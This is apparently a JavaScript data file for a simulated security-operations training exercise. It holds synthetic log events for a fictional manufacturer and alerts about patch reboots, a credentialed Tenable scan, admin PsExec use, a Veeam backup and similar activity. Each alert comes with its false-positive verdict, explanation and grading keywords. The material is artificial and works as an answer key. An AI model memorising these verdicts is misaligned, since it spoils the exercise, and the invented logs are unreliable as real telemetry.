  E('e-fp5-06', '09:10:35', 'WinEvent', 'h-jump01', '4688 Process Creation', '4688: NewProcessName=PsExec64.exe CommandLine="psexec64.exe \\\\WKS-PENSLEY cmd /c ipconfig /renew" SubjectUserName=ykhatri', { commandLine: 'psexec64.exe \\\\WKS-PENSLEY cmd /c ipconfig /renew' }, { user: 'ykhatri' });
  E('e-fp5-07', '09:10:50', 'WinEvent', 'h-ws-pensley', '7045 Service Install', '7045: ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem', { serviceName: 'PSEXESVC' }, { user: 'ykhatri' });
  E('e-fp5-08', '09:11:10', 'WinEvent', 'h-jump01', 'Helpdesk Ticket', 'HD-2291: "Patch stragglers - force IP renew on 3 endpoints that failed DHCP lease after SCCM reboot" assignee=ykhatri status=In Progress', { ticket: 'HD-2291' }, { user: 'ykhatri' });
  E('e-fp5-09', '09:11:40', 'EDR', 'h-jump01', 'ProcessTerminate', 'EDR: PsExec64.exe sessions closed, all 3 remote services removed cleanly', {}, { user: 'ykhatri' });

  // ---------- FP6: SCCM-pushed encoded PowerShell compliance script ----------
  E('e-fp6-01', '09:24:10', 'EDR', 'h-ws-hvoss', 'ProcessCreate', 'EDR: powershell.exe -NoProfile -EncodedCommand JABwAGEAdABjAGgAIABjAG8AbQBwAGwAaQBhAG4AYwBlAA==  parent=CcmExec.exe user=NT AUTHORITY\\SYSTEM signed=true publisher="Microsoft Corporation"', { process: 'powershell.exe', parent: 'CcmExec.exe' });
  E('e-fp6-02', '09:24:15', 'WinEvent', 'h-ws-hvoss', '4688 Process Creation', '4688: NewProcessName=powershell.exe ParentProcessName=CcmExec.exe CommandLine="-EncodedCommand JABwAGEAdABjAGgA..." SubjectUserName=SYSTEM', { commandLine: '-EncodedCommand (decodes to Verify-NovRollup-Compliance.ps1 body)' });
  E('e-fp6-03', '09:24:40', 'WinEvent', 'h-sccm01', 'SCCM Script Log', 'SCCM: Script "Verify-NovRollup-Compliance.ps1" executed on WKS-HVOSS via CM client, exit code=0', { script: 'Verify-NovRollup-Compliance.ps1' });
  E('e-fp6-04', '09:25:05', 'WinEvent', 'h-sccm01', 'SCCM Script Log', 'SCCM: Compliance baseline "Nov-2026-Rollup-Verify" reports Compliant for WKS-HVOSS', { baseline: 'Nov-2026-Rollup-Verify' });
  E('e-fp6-05', '09:26:00', 'WinEvent', 'h-ws-hvoss', '4688 Process Creation', '4688: NewProcessName=powershell.exe exited normally, no network connections opened, no file writes outside C:\\Windows\\CCM\\', {});

  // ---------- FP7: New service installed by patch rollup (7045) ----------
  E('e-fp7-01', '09:30:00', 'WinEvent', 'h-ws-rcastellano', '7045 Service Install', '7045: ServiceName=WdNisSvc DisplayName="Windows Defender Antivirus Network Inspection Service" ImagePath=%ProgramFiles%\\Windows Defender\\NisSrv.exe', { serviceName: 'WdNisSvc' }, { user: 'rcastellano' });
  E('e-fp7-02', '09:30:05', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: Package "Nov-2026-SecurityRollup" install completed on WKS-RCASTELLANO, RebootRequired=true', { package: 'Nov-2026-SecurityRollup' });
  E('e-fp7-03', '09:31:00', 'WinEvent', 'h-ws-rcastellano', '1074 System shutdown/restart', '1074: Process CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' }, { user: 'rcastellano' });
  E('e-fp7-04', '09:33:00', 'WinEvent', 'h-ws-rcastellano', '7036 Service Control Manager', '7036: Service "WdNisSvc" entered the running state', {}, { user: 'rcastellano' });

  // ---------- FP8: Defender definition update kills benign process ----------
  E('e-fp8-01', '09:50:00', 'WinEvent', 'h-ws-tmull', 'Windows Defender', 'Defender: Security intelligence update applied, version 1.423.112.0', { version: '1.423.112.0' }, { user: 'tmull' });
  E('e-fp8-02', '09:50:20', 'WinEvent', 'h-ws-tmull', 'Windows Defender', 'Defender: Threat detected Trojan:Script/Wacatac.B!ml, action=Quarantine, process=invtrack_agent.exe path=C:\\Program Files\\InvTrack\\invtrack_agent.exe', { threat: 'Trojan:Script/Wacatac.B!ml' }, { user: 'tmull' });
  E('e-fp8-03', '09:50:25', 'EDR', 'h-ws-tmull', 'ProcessTerminate', 'EDR: invtrack_agent.exe terminated reason=AV_Quarantine', {}, { user: 'tmull' });
  E('e-fp8-04', '09:55:00', 'WinEvent', 'h-ws-rcastellano', 'Windows Defender', 'Defender: Threat detected Trojan:Script/Wacatac.B!ml, action=Quarantine, process=invtrack_agent.exe (same signature update, second host)', { threat: 'Trojan:Script/Wacatac.B!ml' }, { user: 'rcastellano' });
  E('e-fp8-05', '10:02:00', 'Email', 'h-ws-tmull', 'Delivered', 'Email delivered: Lena Fischer (CTI) "Known Defender FP - invtrack_agent.exe heuristic Wacatac.B!ml - vendor confirmed clean, ticket suppressed" to soc-dl', { subject: 'Known Defender FP - invtrack_agent.exe' });

  // ---------- FP9: Vendor ERP installer flagged by heuristic, clean per intel ----------
  E('e-fp9-01', '09:58:00', 'Proxy', 'h-ws-mquinn', 'HTTP GET', 'Proxy: GET https://portal.meridiansystems-erp.com/downloads/MeridianERPSetup_v14.2.exe status=200 user=mquinn', { url: 'https://portal.meridiansystems-erp.com/downloads/MeridianERPSetup_v14.2.exe' }, { user: 'mquinn' });
  E('e-fp9-02', '10:00:00', 'EDR', 'h-ws-mquinn', 'ProcessCreate', 'EDR: MeridianERPSetup_v14.2.exe  parent=chrome.exe user=CORP\\mquinn signed=true publisher="Meridian Systems Inc."', { process: 'MeridianERPSetup_v14.2.exe', parent: 'chrome.exe' }, { user: 'mquinn' });
  E('e-fp9-03', '10:00:40', 'EDR', 'h-ws-mquinn', 'Alert', 'EDR: heuristic flag=suspicious note="packed binary heuristic match" process=MeridianERPSetup_v14.2.exe', { flag: 'suspicious' }, { user: 'mquinn' });
  E('e-fp9-04', '10:01:00', 'WinEvent', 'h-ws-mquinn', '4688 Process Creation', '4688: NewProcessName=MeridianERPSetup_v14.2.exe CommandLine="MeridianERPSetup_v14.2.exe /silent /log install.log" SubjectUserName=mquinn', { commandLine: 'MeridianERPSetup_v14.2.exe /silent /log install.log' }, { user: 'mquinn' });
  E('e-fp9-05', '10:03:00', 'EDR', 'h-ws-mquinn', 'FileCreate', 'EDR: install.log written C:\\ProgramData\\Meridian\\install.log, setup exit code=0', { path: 'C:\\ProgramData\\Meridian\\install.log' }, { user: 'mquinn' });
  E('e-fp9-06', '10:04:00', 'WinEvent', 'h-ws-mquinn', '7045 Service Install', '7045: ServiceName=MeridianERPAgent ImagePath=%ProgramFiles%\\Meridian\\ERPAgent.exe AccountName=LocalSystem', { serviceName: 'MeridianERPAgent' }, { user: 'mquinn' });

  // ---------- FP10: After-hours plant engineer login (scheduled night shift) ----------
  E('e-fp10-01', '03:58:00', 'WinEvent', 'h-plant2-eng01', '4624 Logon', '4624: LogonType=2 SubjectUserName=bshaw (interactive console logon)', { logonType: 2 }, { user: 'bshaw' });
  E('e-fp10-02', '03:59:10', 'WinEvent', 'h-plant2-eng01', '4688 Process Creation', '4688: NewProcessName=scada_monitor.exe CommandLine="scada_monitor.exe --line2-moisture" SubjectUserName=bshaw', { commandLine: 'scada_monitor.exe --line2-moisture' }, { user: 'bshaw' });
  E('e-fp10-03', '04:05:00', 'VPN', 'h-plant2-eng01', 'Connect', 'VPN: client connected user=bshaw gateway=Plant2-VPN duration_est=4h', {}, { user: 'bshaw' });
  E('e-fp10-04', '07:50:00', 'WinEvent', 'h-plant2-eng01', '4634 Logoff', '4634: SubjectUserName=bshaw LogonType=2 (end of night shift)', { logonType: 2 }, { user: 'bshaw' });
  E('e-fp10-05', '08:02:00', 'IAM', 'h-plant2-eng01', 'Odd-Hours Logon', 'IAM: rule IAM-Odd-Hours-008 flags bshaw login at 03:58 outside normal 09:00-17:00 window', {}, { user: 'bshaw' });

  // ---------- FP11: Failed logon spike / lockout, Hannah Voss cached phone password ----------
  E('e-fp11-01', '10:15:00', 'WinEvent', 'h-dc01', '4625 Logon Failure', '4625: TargetUserName=hvoss WorkstationName=HVOSS-PHONE Status=0xC000006A (bad password)', {}, { user: 'hvoss' });
  E('e-fp11-02', '10:16:00', 'WinEvent', 'h-dc01', '4625 Logon Failure', '4625: TargetUserName=hvoss WorkstationName=HVOSS-PHONE Status=0xC000006A (bad password)', {}, { user: 'hvoss' });
  E('e-fp11-03', '10:17:00', 'WinEvent', 'h-dc01', '4625 Logon Failure', '4625: TargetUserName=hvoss WorkstationName=HVOSS-PHONE Status=0xC000006A (bad password)', {}, { user: 'hvoss' });
  E('e-fp11-04', '10:18:00', 'WinEvent', 'h-dc01', '4625 Logon Failure', '4625: TargetUserName=hvoss WorkstationName=HVOSS-PHONE Status=0xC000006A (bad password)', {}, { user: 'hvoss' });
  E('e-fp11-05', '10:19:00', 'WinEvent', 'h-dc01', '4740 Account Lockout', '4740: TargetUserName=hvoss CallerComputerName=HVOSS-PHONE', {}, { user: 'hvoss' });
  E('e-fp11-06', '10:22:00', 'WinEvent', 'h-dc01', 'Helpdesk Ticket', 'HD-2298: "Account locked after mandatory patch-day password rotation reminder, phone had cached old password" assignee=opratt status=Resolved', { ticket: 'HD-2298' }, { user: 'hvoss' });

  // ---------- FP12: SQL01 service restart from patch reboot flagged as critical outage ----------
  E('e-fp12-01', '13:00:00', 'WinEvent', 'h-sql01', '7036 Service Control Manager', '7036: Service "SQL Server (MSSQLSERVER)" entered the stopped state', {});
  E('e-fp12-02', '13:00:05', 'WinEvent', 'h-sql01', '1074 System shutdown/restart', '1074: Process CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' });
  E('e-fp12-03', '13:02:30', 'WinEvent', 'h-sql01', '7036 Service Control Manager', '7036: Service "SQL Server Agent (MSSQLSERVER)" entered the stopped state', {});
  E('e-fp12-04', '13:04:50', 'WinEvent', 'h-sql01', '7036 Service Control Manager', '7036: Service "SQL Server (MSSQLSERVER)" entered the running state', {});
  E('e-fp12-05', '13:05:10', 'WinEvent', 'h-sql01', '7036 Service Control Manager', '7036: Service "SQL Server Agent (MSSQLSERVER)" entered the running state', {});

  // ---------- FP13: legit daytime Veeam offsite sync (svc-backup), superficially like TP exfil ----------
  E('e-fp13-01', '10:30:00', 'WinEvent', 'h-bkp01', '4624 Logon', '4624: LogonType=3 SubjectUserName=svc-backup WorkstationName=BKP01 IpAddress=10.40.0.21 AuthenticationPackage=Kerberos', { logonType: 3, authPkg: 'Kerberos' }, { user: 'svc-backup', src: '10.40.0.21' });
  E('e-fp13-02', '10:30:30', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Offsite-Cloud-FullSync" started repository=AzureBlob-DR, rescheduled to daytime per CHG-4499 (Patch Tuesday conflict)', { job: 'Offsite-Cloud-FullSync' }, { user: 'svc-backup' });
  E('e-fp13-03', '10:31:00', 'Firewall', 'h-bkp01', 'Allow', 'FW ALLOW proto=TCP src=10.40.0.21:443 dst=198.51.100.22:443 bytes_out=4.2GB app=Veeam.Backup.Transport.exe domain=cfindustrialbackup.blob.core.windows.net', { action: 'allow', bytesOut: '4.2GB' }, { user: 'svc-backup', src: '10.40.0.21', dst: '198.51.100.22' });
  E('e-fp13-04', '10:45:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Offsite-Cloud-FullSync" progress 60%, throttled to 50MB/s per bandwidth policy "Business Hours"', { job: 'Offsite-Cloud-FullSync' }, { user: 'svc-backup' });
  E('e-fp13-05', '10:50:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Offsite-Cloud-FullSync" completed Result=Success DataTransferred=4.2GB Repository=AzureBlob-DR', { job: 'Offsite-Cloud-FullSync', status: 'Success' }, { user: 'svc-backup' });

  // ---------- FP14: vendor remote support RDP to JUMP01 from unfamiliar NAT IP ----------
  E('e-fp14-01', '11:15:00', 'WinEvent', 'h-jump01', '4624 Logon', '4624: LogonType=10 SubjectUserName=vendorsupport IpAddress=198.51.100.44 (RDP via Meridian Systems VPN gateway)', { logonType: 10 }, { user: 'vendorsupport', src: '198.51.100.44' });
  E('e-fp14-02', '11:15:30', 'WinEvent', 'h-jump01', '4688 Process Creation', '4688: NewProcessName=erp_diag.exe CommandLine="erp_diag.exe --connect SQL01 --module invoicing" SubjectUserName=vendorsupport', { commandLine: 'erp_diag.exe --connect SQL01 --module invoicing' }, { user: 'vendorsupport' });
  E('e-fp14-03', '11:18:00', 'WinEvent', 'h-jump01', 'Helpdesk Ticket', 'HD-2302: "Scheduled vendor remote session - ERP invoicing module troubleshooting" vendor=Meridian Systems approver=famaro', { ticket: 'HD-2302' }, { user: 'vendorsupport' });
  E('e-fp14-04', '11:38:00', 'WinEvent', 'h-jump01', '4634 Logoff', '4634: SubjectUserName=vendorsupport LogonType=10 (session closed)', { logonType: 10 }, { user: 'vendorsupport' });

  // ---------- FP15: helpdesk adds Curtis Dao to LOCAL admins on his own laptop (not domain admins) ----------
  E('e-fp15-01', '12:05:00', 'WinEvent', 'h-dc01', '4732 Member Added to Security-Enabled Local Group', '4732: GroupName="Administrators" MemberName=cdao TargetComputer=WKS-CDAO SubjectUserName=opratt', { group: 'Administrators (local)' }, { user: 'opratt' });
  E('e-fp15-02', '12:05:30', 'WinEvent', 'h-dc01', '4624 Logon', '4624: LogonType=2 SubjectUserName=opratt (console, imaging bench)', { logonType: 2 }, { user: 'opratt' });
  E('e-fp15-03', '12:06:00', 'WinEvent', 'h-dc01', 'Helpdesk Ticket', 'HD-2305: "New laptop imaging for cdao - local admin rights for software installs" assignee=opratt status=Resolved', { ticket: 'HD-2305' }, { user: 'opratt' });
  E('e-fp15-04', '12:07:00', 'WinEvent', 'h-dc01', '4733 Member Removed from Security-Enabled Local Group', '4733: GroupName="Domain Admins" checked - no membership changes to this group today', { group: 'Domain Admins' });

  // ---------- FP16: USB barcode scanner dock on warehouse PC ----------
  E('e-fp16-01', '14:00:00', 'WinEvent', 'h-ws-tmull', 'DeviceInstall', 'DeviceInstall: USB device VID_0483&PID_5750 "Zebra Barcode Scanner Cradle" connected', {}, { user: 'tmull' });
  E('e-fp16-02', '14:00:10', 'EDR', 'h-ws-tmull', 'DeviceConnect', 'EDR: removable device class=USB description="Zebra Barcode Scanner Cradle" serial=ZB5750-0019', {}, { user: 'tmull' });
  E('e-fp16-03', '14:00:30', 'WinEvent', 'h-ws-tmull', '4688 Process Creation', '4688: NewProcessName=ZebraScannerSvc.exe CommandLine="ZebraScannerSvc.exe --autostart" SubjectUserName=tmull', { commandLine: 'ZebraScannerSvc.exe --autostart' }, { user: 'tmull' });
  E('e-fp16-04', '14:01:00', 'WinEvent', 'h-ws-tmull', 'Helpdesk Ticket', 'HD-2299: "Deploy new barcode scanner docks to shipping" assignee=cdao status=Resolved', { ticket: 'HD-2299' }, { user: 'tmull' });

  // ---------- FP17: lookalike marketing domain, not phishing ----------
  E('e-fp17-01', '14:35:00', 'Proxy', 'h-ws-iferraro', 'HTTP GET', 'Proxy: GET http://cf-industrialsupply-portal.net/login status=200 user=iferraro', { url: 'http://cf-industrialsupply-portal.net/login' }, { user: 'iferraro' });
  E('e-fp17-02', '14:35:05', 'DNS', 'h-ws-iferraro', 'DNS Query', 'DNS query qname=cf-industrialsupply-portal.net qtype=A', { domain: 'cf-industrialsupply-portal.net' }, { user: 'iferraro' });
  E('e-fp17-03', '14:35:20', 'Proxy', 'h-ws-iferraro', 'HTTP GET', 'Proxy: GET http://cf-industrialsupply-portal.net/promo/favicon.ico status=200 user=iferraro', { url: 'http://cf-industrialsupply-portal.net/promo/favicon.ico' }, { user: 'iferraro' });
  E('e-fp17-04', '14:30:00', 'Email', 'h-ws-iferraro', 'Delivered', 'Email delivered: "Caldwell-Fenn Trade Show Giveaway - Register Now" from marketing-agency@cf-industrialsupply-portal.net to iferraro', { subject: 'Caldwell-Fenn Trade Show Giveaway' }, { user: 'iferraro' });

  // ---------- Background / padding color events (not tied to specific alerts) ----------
  E('e-pad-001', '08:15:00', 'WinEvent', 'h-ws-dhollis', '4624 Logon', '4624: LogonType=2 SubjectUserName=dhollis', { logonType: 2 }, { user: 'dhollis' });
  E('e-pad-002', '08:16:00', 'WinEvent', 'h-ws-ncastillo', '4624 Logon', '4624: LogonType=2 SubjectUserName=ncastillo', { logonType: 2 }, { user: 'ncastillo' });
  E('e-pad-003', '08:20:00', 'WinEvent', 'h-ws-rcastellano', '4624 Logon', '4624: LogonType=2 SubjectUserName=rcastellano', { logonType: 2 }, { user: 'rcastellano' });
  E('e-pad-004', '08:22:00', 'WinEvent', 'h-ws-pensley', '4624 Logon', '4624: LogonType=2 SubjectUserName=pensley', { logonType: 2 }, { user: 'pensley' });
  E('e-pad-005', '08:25:00', 'WinEvent', 'h-ws-mquinn', '4624 Logon', '4624: LogonType=2 SubjectUserName=mquinn', { logonType: 2 }, { user: 'mquinn' });
  E('e-pad-006', '08:28:00', 'WinEvent', 'h-ws-strain', '4624 Logon', '4624: LogonType=2 SubjectUserName=strain', { logonType: 2 }, { user: 'strain' });
  E('e-pad-007', '08:30:00', 'WinEvent', 'h-ws-tmull', '4624 Logon', '4624: LogonType=2 SubjectUserName=tmull', { logonType: 2 }, { user: 'tmull' });
  E('e-pad-008', '08:31:00', 'WinEvent', 'h-ws-iferraro', '4624 Logon', '4624: LogonType=2 SubjectUserName=iferraro', { logonType: 2 }, { user: 'iferraro' });
  E('e-pad-009', '08:33:00', 'WinEvent', 'h-ws-ykhatri', '4624 Logon', '4624: LogonType=2 SubjectUserName=ykhatri', { logonType: 2 }, { user: 'ykhatri' });
  E('e-pad-010', '08:40:00', 'DNS', 'h-ws-dhollis', 'DNS Query', 'DNS query qname=sccm01.cfindustrial.com qtype=A', { domain: 'sccm01.cfindustrial.com' }, { user: 'dhollis' });
  E('e-pad-011', '08:41:00', 'DNS', 'h-ws-ncastillo', 'DNS Query', 'DNS query qname=bkp01.cfindustrial.com qtype=A', { domain: 'bkp01.cfindustrial.com' }, { user: 'ncastillo' });
  E('e-pad-012', '08:45:00', 'DNS', 'h-ws-rcastellano', 'DNS Query', 'DNS query qname=outlook.office365.com qtype=A', { domain: 'outlook.office365.com' }, { user: 'rcastellano' });
  E('e-pad-013', '08:46:00', 'DNS', 'h-ws-pensley', 'DNS Query', 'DNS query qname=teams.microsoft.com qtype=A', { domain: 'teams.microsoft.com' }, { user: 'pensley' });
  E('e-pad-014', '08:50:00', 'VPN', 'h-ws-vnakamura', 'Connect', 'VPN: client connected user=vnakamura gateway=Plant1-VPN', {}, { user: 'vnakamura' });
  E('e-pad-015', '08:52:00', 'VPN', 'h-ws-dhollis', 'Connect', 'VPN: client connected user=dhollis gateway=HQ-VPN', {}, { user: 'dhollis' });
  E('e-pad-016', '09:00:00', 'Cloud', 'h-ws-todom', 'Sign-in', 'O365: sign-in success user=todom app=Outlook location=HQ', {}, { user: 'todom' });
  E('e-pad-017', '09:02:00', 'Cloud', 'h-ws-hvoss', 'Sign-in', 'O365: sign-in success user=hvoss app=Excel location=HQ', {}, { user: 'hvoss' });
  E('e-pad-018', '09:05:00', 'Proxy', 'h-ws-vnakamura', 'HTTP GET', 'Proxy: GET https://news.industrytoday.example/manufacturing status=200 user=vnakamura', { url: 'https://news.industrytoday.example/manufacturing' }, { user: 'vnakamura' });
  E('e-pad-019', '09:06:00', 'Proxy', 'h-ws-todom', 'HTTP GET', 'Proxy: GET https://calendar.cfindustrial.com/exec status=200 user=todom', { url: 'https://calendar.cfindustrial.com/exec' }, { user: 'todom' });
  E('e-pad-020', '09:15:00', 'Firewall', 'h-sql01', 'Allow', 'FW ALLOW proto=TCP src=10.40.0.40:1433 dst=10.40.13.31:51022 app=sqlservr.exe', { action: 'allow' }, { src: '10.40.0.40', dst: '10.40.13.31' });
  E('e-pad-021', '09:20:00', 'DLP', 'h-ws-hvoss', 'File Access', 'DLP: file read \\\\FS01\\Finance$\\budgets\\2027-draft.xlsx by hvoss, no exfil indicators', {}, { user: 'hvoss' });
  E('e-pad-022', '09:22:00', 'DLP', 'h-ws-pensley', 'File Access', 'DLP: file read \\\\FS01\\Finance$\\ap\\vendor_invoices.xlsx by pensley, no exfil indicators', {}, { user: 'pensley' });
  E('e-pad-023', '09:45:00', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: Wave 2 maintenance window opened for Plant1/Plant2 OT-adjacent collection, 40 endpoints', { window: 'Patch-Tuesday-Plant' });
  E('e-pad-024', '10:00:00', 'WinEvent', 'h-plant2-eng01', '7036 Service Control Manager', '7036: Service "BITS" entered the stopped state (patch install)', {}, { user: 'bshaw' });
  E('e-pad-025', '10:10:00', 'WinEvent', 'h-ws-vnakamura', '1074 System shutdown/restart', '1074: Process CcmExec.exe initiated restart, Reason=Operating System: Patch (Planned)', { reason: 'Patch (Planned)' }, { user: 'vnakamura' });
  E('e-pad-026', '10:30:00', 'Email', 'h-ws-todom', 'Delivered', 'Email delivered: "Weekly IOC Digest" from Lena Fischer to soc-dl', { subject: 'Weekly IOC Digest' });
  E('e-pad-027', '11:00:00', 'Auth', 'h-dc02', '4624 Logon', '4624: LogonType=3 SubjectUserName=famaro IpAddress=10.40.0.30 (jump host admin session)', { logonType: 3 }, { user: 'famaro' });
  E('e-pad-028', '11:30:00', 'Firewall', 'h-dc01', 'Allow', 'FW ALLOW proto=UDP src=10.40.0.10:123 dst=10.40.0.11:123 app=w32time.exe (NTP sync)', { action: 'allow' });
  E('e-pad-029', '12:00:00', 'Cloud', 'h-ws-rcastellano', 'Sign-in', 'O365: sign-in success user=rcastellano app=SharePoint location=Plant 1', {}, { user: 'rcastellano' });
  E('e-pad-030', '12:30:00', 'WinEvent', 'h-sccm01', 'SCCM Deployment', 'SCCM: End-of-day compliance summary - 843/847 compliant, 4 pending user-initiated reboot', { package: 'Nov-2026-SecurityRollup', compliant: 843 });
  E('e-pad-031', '13:30:00', 'DNS', 'h-ws-mquinn', 'DNS Query', 'DNS query qname=portal.meridiansystems-erp.com qtype=A', { domain: 'portal.meridiansystems-erp.com' }, { user: 'mquinn' });
  E('e-pad-032', '14:30:00', 'Proxy', 'h-ws-strain', 'HTTP GET', 'Proxy: GET https://workday.cfindustrial.com/benefits status=200 user=strain', { url: 'https://workday.cfindustrial.com/benefits' }, { user: 'strain' });
  E('e-pad-033', '15:00:00', 'Auth', 'h-jump01', '4624 Logon', '4624: LogonType=10 SubjectUserName=dhollis IpAddress=10.40.11.12 (routine admin session)', { logonType: 10 }, { user: 'dhollis' });
  E('e-pad-034', '15:10:00', 'WinEvent', 'h-jump01', '4688 Process Creation', '4688: NewProcessName=mmc.exe CommandLine="mmc.exe dsa.msc" SubjectUserName=dhollis', { commandLine: 'mmc.exe dsa.msc' }, { user: 'dhollis' });
  E('e-pad-035', '15:30:00', 'WinEvent', 'h-bkp01', 'Veeam Job', 'Veeam: Job "Weekly-SQL-Backup" started repository=Repo-Primary', { job: 'Weekly-SQL-Backup' });
  E('e-pad-036', '15:45:00', 'DLP', 'h-ws-iferraro', 'File Access', 'DLP: file read \\\\FS01\\Procurement$\\contracts\\meridian-msa.pdf by iferraro, no exfil indicators', {}, { user: 'iferraro' });

  const alerts = [
    al('A-2101', '08:05', 'Mass service stop across endpoint fleet', 'medium', 'SIEM', 'SIEM-Avail-002 Mass service stop', 'h-sccm01', null,
      'Correlation rule observed Windows Defender, BITS, Print Spooler and related services entering a stopped state on 40+ endpoints within a 10 minute window.',
      { 'Services affected': 'WinDefend, BITS, Spooler', 'Hosts affected': '40+', 'Window': '07:02-07:08' },
      ['e-fp1-01', 'e-fp1-02', 'e-fp1-03', 'e-fp1-04', 'e-fp1-05'],
      [{ type: 'host', value: 'SCCM01' }], 'FP',
      { explain: 'SCCM pushed the November security rollup starting 00:35 with phased reboots; service stops are the normal side-effect of patch installs/reboots, confirmed by CHG-4450 and CHG-4471 and the SCCM deployment log.',
        reply: { fp: 'Confirmed this tracks the Patch Tuesday deployment window in the change calendar (CHG-4450/CHG-4471). SCCM compliance log shows the same hosts received the November rollup. Close as FP.' },
        keywords: ['patch tuesday', 'sccm', 'service stop', 'reboot', 'maintenance window'],
        helpdeskReply: 'Yeah, that is just the patch wave. We see the same ticket spike every second Tuesday.' }),

    al('A-2102', '08:10', 'After-hours logon on Plant 2 engineering workstation', 'medium', 'IAM', 'IAM-Odd-Hours-008 Login outside normal business hours', 'h-plant2-eng01', 'u-bshaw',
      'Interactive logon recorded at 03:58 local time on a plant engineering endpoint, well outside the typical 09:00-17:00 window for this department.',
      { 'Logon time': '03:58', 'Logon type': '2 (Interactive)', 'Account': 'bshaw' },
      ['e-fp10-01', 'e-fp10-02', 'e-fp10-03', 'e-fp10-04'],
      [{ type: 'user', value: 'bshaw' }, { type: 'host', value: 'PLANT2-ENG01' }], 'FP',
      { explain: 'Brendan Shaw is on the scheduled night rotation covering Plant 2 line-2 moisture sensors this week; helpdesk and the user both confirm, and the only process run was the known SCADA monitoring tool.',
        reply: { fp: 'Verified against the plant shift roster - bshaw is on nights this week. Only process executed was scada_monitor.exe, no other activity. Close as FP.' },
        keywords: ['after hours', 'plant engineer', 'night shift', 'ot'],
        userReply: 'Yeah I am on nights this week covering the line 2 moisture sensors, nothing unusual.',
        helpdeskReply: "Brendan's on the night rotation for Plant 2 OT monitoring coverage this week, that is his normal shift." }),

    al('A-2103', '08:20', 'Mass file modification/rename on FS01 (possible ransomware behavior)', 'critical', 'DLP', 'SIEM-Ransom-010 Mass file modify/rename rate', 'h-fs01', null,
      'File server FS01 recorded roughly 18,000 file modify/rename operations within a 12 minute window, a pattern consistent with bulk encryption or destructive activity.',
      { 'Files touched': '18,342', 'Window': '02:03-04:55', 'Process': 'robocopy.exe (signed, Microsoft)' },
      ['e-fp2-01', 'e-fp2-02', 'e-fp2-03', 'e-fp2-04', 'e-fp2-05', 'e-fp2-06', 'e-fp2-07'],
      [{ type: 'host', value: 'FS01' }], 'FP',
      { explain: 'This was the scheduled Veeam repository migration (CHG-4455), a robocopy /MIR mirror job moving \\\\FS01\\Shared$ to a new NAS mount. The process is signed robocopy.exe, the account is svc-veeam-repl (not svc-backup), and the Veeam job log shows a clean Success completion, not encryption or deletion.',
        reply: { fp: 'This matches CHG-4455, the FS01-to-NAS02 repo migration. Veeam job log confirms Success with 18,342 files copied, zero skipped/failed, and the file operations are renames from a signed robocopy process, not encryption. Close as FP, but worth tuning the rule to exclude migration windows.' },
        keywords: ['mass file modification', 'ransomware', 'robocopy', 'veeam migration', 'false positive'] }),

    al('A-2104', '08:35', 'Failed authentication spike from single internal source', 'high', 'IAM', 'IAM-Bruteforce-005 Rapid failed logons single source', 'h-dc01', 'u-svc-tenable',
      'Account svc-tenable-scan generated over 200 failed authentication attempts against roughly 40 distinct hosts within 15 minutes from 10.40.0.60.',
      { 'Source': '10.40.0.60 (TENSCAN01)', 'Attempts': '230+', 'Window': '06:00-06:15' },
      ['e-fp3-01', 'e-fp3-02', 'e-fp3-03', 'e-fp3-04', 'e-fp3-05', 'e-fp3-06', 'e-fp3-07'],
      [{ type: 'host', value: 'TENSCAN01' }, { type: 'user', value: 'svc-tenable-scan' }], 'FP',
      { explain: 'This is the monthly Tenable authenticated compliance scan (CHG-4480) probing default/local-admin account names on every host as part of credentialed checks; the Tenable scan log confirms the job and timeframe, and svc-tenable-scan is a known internal service account, not an attacker.',
        reply: { fp: 'Matches the Tenable monthly authenticated scan window in CHG-4480. Source is the scanner itself and the failed attempts are credential probing against common default account names, not a real brute force. Close as FP.' },
        keywords: ['failed logon', 'brute force', 'tenable', 'authenticated scan'] }),

    al('A-2105', '08:50', 'Sequential SMB admin-share connections resembling lateral movement', 'medium', 'NDR', 'NDR-Lateral-021 Sequential SMB admin-share connections', 'h-tenscan01', 'u-svc-tenable',
      'svc-tenable-scan connected to \\\\*\\C$ and \\\\*\\ADMIN$ on 35 hosts sequentially within a 20 minute window, a pattern also seen in lateral-movement tooling.',
      { 'Shares': 'ADMIN$, C$', 'Hosts touched': '35', 'Source': '10.40.0.60' },
      ['e-fp4-01', 'e-fp4-02', 'e-fp4-03', 'e-fp4-04', 'e-fp4-05', 'e-fp4-06'],
      [{ type: 'host', value: 'TENSCAN01' }], 'FP',
      { explain: 'Same Tenable authenticated scan (CHG-4480); admin-share enumeration is required for the CIS compliance plugin set and is documented in the Tenable scan log, source account is the internal scanner service account.',
        reply: { fp: 'Confirmed as part of the Tenable CIS compliance plugin run, same ticket as the failed-logon alert. No credential theft or unusual account involved. Close as FP.' },
        keywords: ['smb', 'admin share', 'lateral movement', 'tenable scan'] }),

    al('A-2106', '09:12', 'PsExec-style remote service execution from jump host', 'high', 'EDR', 'EDR-LatMove-009 PsExec-style remote execution', 'h-jump01', 'u-ykhatri',
      'PsExec64.exe executed from JUMP01, installing a remote PSEXESVC service on 3 endpoints during the active patch window.',
      { 'Tool': 'PsExec64.exe (Sysinternals, signed)', 'Targets': 'WKS-STRAIN, WKS-IFERRARO, WKS-PENSLEY', 'Account': 'ykhatri' },
      ['e-fp5-01', 'e-fp5-02', 'e-fp5-03', 'e-fp5-04', 'e-fp5-05', 'e-fp5-06', 'e-fp5-07'],
      [{ type: 'user', value: 'ykhatri' }, { type: 'host', value: 'JUMP01' }], 'FP',
      { explain: 'Yusuf Khatri is a Senior Systems Administrator working the documented patch-straggler ticket HD-2291, forcing an IP renew on three endpoints that failed DHCP lease after their SCCM reboot. The PsExec binary is signed Sysinternals, the account is an authorized admin logging on interactively first, and the command is benign (ipconfig /renew) - compare to the attacker\'s PSEXESVC install on FS02 under the svc-backup service account with no interactive logon and tamper/discovery commands.',
